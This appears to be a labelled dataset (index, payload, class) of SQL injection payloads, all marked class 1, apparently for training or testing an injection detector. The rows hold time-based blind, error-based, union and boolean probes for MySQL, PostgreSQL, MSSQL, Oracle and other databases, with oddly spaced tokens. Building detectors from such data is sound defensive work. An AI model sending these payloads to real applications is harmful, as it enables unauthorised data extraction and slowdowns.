index,payload,class
2752,select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,1
2753,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
2754,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  '%'  =  '",1
2755,-1621' in boolean mode  )   order by 1--,1
2756,"1""  )   as mibc where 3113  =  3113",1
2757,select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,1
2758,"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1
2759,"1%'   )    )     )   union all select null,null#",1
2760,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",1
2761,-9739' or 8571  =  8571--,1
2762,1'||  (  select 'exls' where 3837  =  3837 and sleep  (  5   )    )   ||',1
2763,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
2764,1  )   where 7159  =  7159,1
2765,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",1
2766,"1'   )    )    as omwk where 1414  =  1414 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
2767,"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--",1
2768,"1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
2769,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",1
2770,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1
2771,"1""  )   as qayu where 6222  =  6222 union all select null,null,null#",1
2772,"1  )   union all select null,null,null,null,null,null,null#",1
2773,"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
2774,"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
2775,"1   )    )    as yfvg where 1454  =  1454 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
2776,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
2777,1'+  (  select tdkt where 4535  =  4535,1
2778,1'  )   where 5145  =  5145,1
2779,"1%""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,1
2780,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,1
2781,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'zypa'  =  'zypa",1
2782,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,1
2783,"1'  )   where 9951  =  9951   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
2784,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",1
2785,"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
2786,select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,1
2787,"-3737%"" union all select 4452,4452,4452#",1
2788,1'   )    )    and 3814  =  4272--,1
2789,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk",1
2790,1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'hcpo' like 'hcpo,1
2791,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
2792,"1""  )   where 2680  =  2680 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
2793,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
2794,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
2795,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,1
2796,select   (  case when   (  8711  =  6432  )   then 1 else 8711*  (  select 8711 from master..sysdatabases  )   end  )  --,1
2797,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",1
2798,-8504 where 3086  =  3086 or 1131  =  9188#,1
2799,"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
2800,1 where 6036  =  6036 and 7533  =  7533--,1
2801,1%'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',1
2802,-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869,1
2803,1'   )    )    as pqbq where 1865  =  1865,1
2804,"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",1
2805,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",1
2806,"1'   )    )    union all select null,null,null,null,null--",1
2807,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs",1
2808,"-6611%""   )    )     )   union all select 8918,8918#",1
2809,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lzyl"" like ""lzyl",1
2810,"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
2811,1%' rlike sleep  (  5  )  #,1
2812,1%' or sleep  (  5  )   and '%'  =  ',1
2813,"1  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
2814,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl",1
2815,"-9156'   )    )    union all select 9110,9110,9110,9110#",1
2816,"1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  '",1
2817,"1 where 7072  =  7072 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
2818,"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
2819,1  )   where 8433  =  8433 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
2820,"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
2821,"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346",1
2822, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,1
2823,"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""mejy""  =  ""mejy",1
2824,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
2825,"1"" where 1234  =  1234",1
2826,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",1
2827,"-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
2828,"1%""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,1
2829,"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",1
2830,"waitfor delay '0:0:5' and ""%""  =  """,1
2831, (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,1
2832,"1%""   )    )     )   union all select null,null,null#",1
2833,1  )   where 6725  =  6725 and 1553  =  7419,1
2834,"1""  )  ",1
2835,1' where 1557  =  1557,1
2836,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",1
2837,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'cxjp'  =  'cxjp",1
2838,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",1
2839,"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'rqbf'  =  'rqbf",1
2840,1%' waitfor delay '0:0:5' and '%'  =  ',1
2841,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
2842,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",1
2843,1%'   )    )     )   and sleep  (  5  )  #,1
2844,"1""  )   as hblk where 7982  =  7982 and 9611  =  6142--",1
2845,"-7845' union all select 9574,9574,9574,9574,9574,9574#",1
2846,"1',  (  case when 8260  =  8260 then 1 else null end  )  ",1
2847,end and    (    (   6874  =  6874,1
2848,"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
2849,"1"" where 8734  =  8734",1
2850,"1""  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""wmmg"" like ""wmmg",1
2851,"-1597"" where 5933  =  5933 or 3038  =  3038",1
2852,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'wuux'  =  'wuux,1
2853,"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
2854,"1""  )   as tuem where 1328  =  1328",1
2855,"1%'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",1
2856,1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
2857,"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
2858,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",1
2859,"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",1
2860,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",1
2861,"1""   )    )    as nwnp where 6140  =  6140",1
2862,"1  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
2863,-3861'  )   as zmja where 4036  =  4036 or 9323  =  9323#,1
2864,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",1
2865,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',1
2866,"-1631%""  )   or elt  (  8285  =  1709,1709  )   and   (  ""%""  =  """,1
2867,waitfor delay '0:0:5'--,1
2868,select   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  select 9299 from master..sysdatabases  )   end  )  --,1
2869,1'||  (  select 'brsr' where 5458  =  5458,1
2870,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""%""  =  """,1
2871,"iif  (  8214  =  4954,1,1/0  )  ",1
2872,"1'+  (  select 'zkuf' where 3591  =  3591 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
2873,1   )    )    and 2006  =  2006,1
2874,1'+  (  select 'uqaf' where 7414  =  7414,1
2875,"1"" where 9889  =  9889",1
2876,"1%"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
2877,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",1
2878,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",1
2879,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   '%'  =  '",1
2880,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'dqoz' like 'dqoz,1
2881,1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  1601  =  1601,1
2882,"-4166%""  )   union all select 5190--",1
2883,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   '%'  =  '",1
2884,"1%""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
2885,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'nopu'  =  'nopu",1
2886,"1'   )    )    as rxhe where 3838  =  3838 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
2887,"1""   )    )    as hdyn where 6027  =  6027 union all select null,null,null--",1
2888,"1'  )   as wnyl where 8978  =  8978 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
2889,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
2890,"1'||  (  select 'jnsd' from dual where 2316  =  2316 union all select null,null,null,null,null,null,null#",1
2891,"1%"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""%""  =  """,1
2892,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1
2893,1 where 8393  =  8393,1
2894,"-2013""   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
2895,"1%"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,1
2896,-7971' union all select 4273#,1
2897,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""  =  """,1
2898,1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,1
2899,"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
2900,"1%""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1
2901,-9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038,1
2902,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,1
2903,"-2610%""  )   union all select 7779,7779,7779,7779,7779--",1
2904,"1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1
2905,"1   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   8554  =  8554",1
2906,"1%""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""%""  =  """,1
2907,"1  )   where 7425  =  7425 union all select null,null,null,null,null,null,null,null,null,null--",1
2908,"1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
2909,"1%'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
2910,"-7233""  )   where 7574  =  7574 or 5821  =  3288",1
2911,"-4927'   )    )    union all select 1924,1924#",1
2912,"1 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
2913,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""rntg"" like ""rntg",1
2914,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   ""ykhp"" like ""ykhp",1
2915,"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru",1
2916,"1%""  )   union all select null,null,null,null--",1
2917,"1'||  (  select 'pvmz' from dual where 1090  =  1090 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",1
2918,"1""  )   and elt  (  1889  =  7397,7397  )   and   (  ""kuau""  =  ""kuau",1
2919,"1'   )    )     )   union all select null,null,null#",1
2920,"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",1
2921,1   )    )    as zpvn where 2767  =  2767 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
2922,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",1
2923,"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",1
2924,1   )    )    as ehlg where 6340  =  6340,1
2925,"1,  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1
2926,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",1
2927,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""%""  =  """,1
2928,"1%""   )    )     )   and 3116  =  9088#",1
2929,1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,1
2930,"1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",1
2931,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",1
2932,"1  )   as rtpl where 1262  =  1262 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
2933,"1%'  )   union all select null,null,null--",1
2934,"1   )    )    as rpwt where 4103  =  4103 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
2935,-4108'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'tqjx'  =  'tqjx,1
2936,"1""   )    )    as itxo where 7916  =  7916",1
2937,"1   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
2938,"1 where 5081  =  5081 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
2939,1'+  (  select 'unpz' where 8186  =  8186,1
2940,"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1
2941,"1""  )   where 9461  =  9461 union all select null,null,null,null,null,null,null,null,null#",1
2942,1  )   as hvsk where 7902  =  7902,1
2943,1'  )   as bscn where 6907  =  6907,1
2944,-7453'   )    )     )   or 8571  =  8571--,1
2945,1' where 2134  =  2134 rlike   (  select   (  case when   (  3613  =  2090  )   then 1 else 0x28 end   )    )   --,1
2946,"1""   )    )    as vxkn where 2443  =  2443 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
2947,select   (  case when   (  5009  =  1133  )   then 5009 else 5009*  (  select 5009 from information_schema.character_sets  )   end  )  #,1
2948,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",1
2949,"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""hrkf"" like ""hrkf",1
2950,-9358' or 9887  =  2569--,1
2951,"1""  )   as evoq where 8193  =  8193 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
2952,-7426' order by 1#,1
2953,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
2954,-9264'  )   or 8571  =  8571--,1
